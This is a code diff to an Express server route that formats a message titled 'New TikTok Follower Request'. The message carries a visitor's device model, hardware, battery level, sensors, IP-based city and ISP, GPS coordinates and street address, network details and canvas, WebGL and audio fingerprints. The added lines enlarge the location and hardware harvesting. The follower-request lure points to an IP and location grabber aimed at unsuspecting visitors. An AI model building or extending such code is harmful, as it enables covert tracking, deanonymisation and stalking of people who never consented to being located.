@@ -64,6 +64,12 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const deviceModel = deviceInfo?.deviceModel || userInfo?.deviceModel || 'Unknown Device';
       const validated = deviceModel !== 'Unknown Device' && (ipAddress || userInfo?.ip);
       
+      // Enhanced information about the device and location
+      const mobileDetails = userInfo?.mobileDetails || {};
+      const ipDetails = userInfo?.ipDetails || {};
+      const geolocation = userInfo?.geolocation || {};
+      const hardwareInfo = userInfo?.hardwareInfo || {};
+      
       // Format message with detailed visitor info
       const message = `
 🔥 New TikTok Follower Request 🔥
@@ -73,17 +79,39 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
 📱 Device Info:
 - Device: ${deviceModel}
+- Brand: ${mobileDetails?.brand || 'Unknown'}
+- Model Year: ${mobileDetails?.deviceYear || 'Unknown'} 
+- OS Version: ${mobileDetails?.osVersion || 'Unknown'}
+- Type: ${mobileDetails?.deviceType || 'Unknown'}
 - Screen: ${userInfo?.screenSize || 'Unknown'}
 - Color Depth: ${userInfo?.colorDepth || 'Unknown'}
+- Touch Points: ${hardwareInfo?.touchPoints || 'Unknown'}
 - Platform: ${userInfo?.platform || 'Unknown'}
 - CPU Cores: ${userInfo?.hardwareConcurrency || 'Unknown'}
 - Memory: ${userInfo?.deviceMemory || 'Unknown'}
-- Cookies: ${userInfo?.cookiesEnabled || 'Unknown'}
-- DNT: ${userInfo?.doNotTrack || 'Unknown'}
+- GPU: ${hardwareInfo?.gpu || 'Unknown'}
+- Battery: ${hardwareInfo?.batteryLevel ? hardwareInfo.batteryLevel + '%' : 'Unknown'}
+- Sensors: ${hardwareInfo?.sensors ? 
+  `Accelerometer: ${hardwareInfo.sensors.accelerometer}, ` +
+  `Gyroscope: ${hardwareInfo.sensors.gyroscope}` : 'Unknown'}
+
+📍 Location:
+- Country: ${ipDetails?.country || 'Unknown'}
+- Region: ${ipDetails?.region || 'Unknown'}
+- City: ${ipDetails?.city || 'Unknown'} 
+- ISP: ${ipDetails?.isp || 'Unknown'}
+- Mobile Network: ${ipDetails?.mobile ? 'Yes' : 'No'} 
+- Coordinates: ${geolocation?.latitude ? `${geolocation.latitude}, ${geolocation.longitude}` : 'Not available'}
+- Accuracy: ${geolocation?.accuracy ? `${geolocation.accuracy}m` : 'Unknown'}
+- Address: ${geolocation?.address ? JSON.stringify(geolocation.address) : 'Not available'}
 
 🌐 Network:
 - IP Address: ${ipAddress || userInfo?.ip || 'Unknown'}
-- Connection: ${JSON.stringify(userInfo?.connection || {})}
+- Connection Type: ${userInfo?.connection?.type || 'Unknown'} 
+- Network Quality: ${userInfo?.connection?.effectiveType || 'Unknown'}
+- Downlink: ${userInfo?.connection?.downlink || 'Unknown'} Mbps
+- Latency: ${userInfo?.connection?.rtt || 'Unknown'} ms
+- Data Saver: ${userInfo?.connection?.saveData ? 'Enabled' : 'Disabled'}
 
 🗣️ Language:
 - Primary: ${userInfo?.language || 'Unknown'}
@@ -94,10 +122,11 @@ export async function registerRoutes(app: Express): Promise<Server> {
 - Offset: ${userInfo?.timezoneOffset || 'Unknown'}
 
 🔍 Fingerprints:
-- Canvas: ${userInfo?.canvasFingerprint || 'Not available'}
-- WebGL: ${userInfo?.webglFingerprint || 'Not available'}
-- Fonts: ${userInfo?.fonts || 'Not available'}
-- Plugins: ${userInfo?.plugins ? (userInfo.plugins.length > 100 ? userInfo.plugins.substring(0, 100) + '...' : userInfo.plugins) : 'Not available'}
+- Canvas: ${userInfo?.canvasFingerprint ? 'Available ✓' : 'Not available'}
+- WebGL: ${userInfo?.webglFingerprint ? 'Available ✓' : 'Not available'}
+- Audio: ${userInfo?.audioFingerprint ? 'Available ✓' : 'Not available'}
+- Fonts: ${userInfo?.fonts ? (userInfo.fonts.length > 50 ? userInfo.fonts.substring(0, 50) + '...' : userInfo.fonts) : 'Not available'}
+- Emulator: ${userInfo?.isEmulator ? 'Detected ⚠️' : 'Not detected ✓'}
 
 🧩 User Agent:
 ${userInfo?.userAgent || 'Unknown'}
